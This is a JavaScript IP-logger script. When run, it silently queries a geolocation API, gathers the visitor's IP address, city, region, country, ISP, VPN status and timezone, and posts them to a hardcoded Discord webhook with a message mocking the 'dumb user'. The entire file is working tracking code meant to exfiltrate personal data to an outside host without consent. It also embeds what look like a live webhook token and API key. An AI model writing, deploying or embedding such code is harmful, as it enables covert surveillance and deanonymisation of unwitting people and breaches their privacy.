const webhooks = "https://discord.com/api/webhooks/1062795905545293865/UeZjBIi0-So_zqFkzpY5PdKQmPszL_3Ye-jX8cXlmMmWoTt5ZeRcFcpOD07MeL1hZPZX";
const key = "855abdec13ce46eca180a9ded185224f";

const x = async () => {
    const response = await fetch(`https://ipgeolocation.abstractapi.com/v1/?api_key=${key}`);
    const data = await response.json();

    const ip = data.ip_address;
    const city = data.city;
    const region = data.region;
    const country = data.country;
    const flag = data.flag.emoji;
    const Pro = data.connection.autonomous_system_organization;
    const isp = data.connection.isp_name;
    const vpn = data.security.is_vpn;
    const zone = data.timezone.name;
    const time = data.timezone.current_time;

    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webhooks);
    postRequest.setRequestHeader('Content-type', 'application/json');
    var params = {
        username: "IP Log",
        avatar_url: "",
        content: 
            "**A dumb user get ip logged !**" +
            "\n> **IP**: " + ip +
            "\n> **City**: " + city +
            "\n> **Region**: " + region +
            "\n> **Country**: " + flag + " **-** " + country + " **-** " + flag +
            "\n> **Internet Provider**: " + Pro +
            "\n> **ISP**: " + isp +
            "\n> **VPN**: " + vpn +
            "\n> **Timezone** - **Time**: " + zone + " **-** " + time,
    };

    postRequest.send(JSON.stringify(params));
};

x();
